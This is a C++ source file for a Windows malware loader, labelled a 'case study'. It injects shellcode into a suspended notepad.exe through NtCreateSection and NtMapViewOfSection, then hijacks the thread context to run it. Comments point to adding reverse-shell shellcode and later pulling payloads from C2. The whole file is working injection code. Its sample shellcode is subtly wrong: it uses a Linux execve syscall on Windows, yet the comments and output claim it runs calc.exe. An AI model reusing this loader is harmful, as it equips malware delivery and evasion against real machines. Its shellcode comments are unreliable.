#include <windows.h>
#include <winternl.h>
#include <iostream>

// CURRENTLY DOESN'T TAKE SHELLCODE FROM C2
// THIS LOADER IS A CASE STUDY

// Add simple reverse shell shellcode

#pragma comment(lib, "ntdll.lib")

// Import undocumented functions
extern "C" {
    NTSYSCALLAPI NTSTATUS NTAPI NtCreateSection(
        PHANDLE SectionHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
        PLARGE_INTEGER MaximumSize OPTIONAL,
        ULONG SectionPageProtection,
        ULONG AllocationAttributes,
        HANDLE FileHandle OPTIONAL);

    NTSYSCALLAPI NTSTATUS NTAPI NtMapViewOfSection(
        HANDLE SectionHandle,
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        SIZE_T CommitSize,
        PLARGE_INTEGER SectionOffset OPTIONAL,
        PSIZE_T ViewSize,
        DWORD InheritDisposition,
        ULONG AllocationType,
        ULONG Win32Protect);
}

// UPDATE SHELLCODE
unsigned char shellcode[] = {
    // Example: 64-bit shellcode that spawns calc.exe
    0x48, 0x31, 0xC0,                         // xor rax, rax
    0x50,                                     // push rax
    0x48, 0xB8, 0x63, 0x61, 0x6C, 0x63,       // mov rax, 'calc'
    0x2E, 0x65, 0x78, 0x65,                   //           '.exe'
    0x50,                                     // push rax
    0x48, 0x89, 0xE0,                         // mov rax, rsp
    0x50,                                     // push rax
    0x48, 0x89, 0xE2,                         // mov rdx, rsp
    0x48, 0x31, 0xC0,                         // xor rax, rax
    0xB0, 0x3B,                               // mov al, 0x3b (execve syscall)
    0x0F, 0x05                                // syscall
};
SIZE_T scSize = sizeof(shellcode);

int main() {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // 1. Create suspended target process (notepad)
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "[-] Failed to create target process.\n";
        return -1;
    }

    // 2. Create memory section (RWX) using NtCreateSection
    HANDLE hSection = NULL;
    LARGE_INTEGER maxSize;
    maxSize.QuadPart = scSize;

    NTSTATUS status = NtCreateSection(&hSection,
        SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
        NULL,
        &maxSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);

    if (status != 0 || !hSection) {
        std::cerr << "[-] NtCreateSection failed.\n";
        return -1;
    }

    // 3. Map section locally (RW) and copy shellcode
    PVOID localAddr = nullptr;
    SIZE_T viewSize = scSize;

    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &localAddr, 0, 0, NULL,
        &viewSize, ViewUnmap, 0, PAGE_READWRITE);

    if (status != 0 || !localAddr) {
        std::cerr << "[-] NtMapViewOfSection (local) failed.\n";
        return -1;
    }

    memcpy(localAddr, shellcode, scSize);

    // 4. Map section remotely (RX) into target process
    PVOID remoteAddr = nullptr;
    viewSize = scSize;

    status = NtMapViewOfSection(hSection, pi.hProcess, &remoteAddr, 0, 0, NULL,
        &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ);

    if (status != 0 || !remoteAddr) {
        std::cerr << "[-] NtMapViewOfSection (remote) failed.\n";
        return -1;
    }

    // 5. Change thread context to point to shellcode
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteAddr;
#else
    ctx.Eip = (DWORD)remoteAddr;
#endif
    SetThreadContext(pi.hThread, &ctx);

    // 6. Resume thread
    ResumeThread(pi.hThread);

    std::cout << "[+] Shellcode executed in hollowed process.\n";
    return 0;
}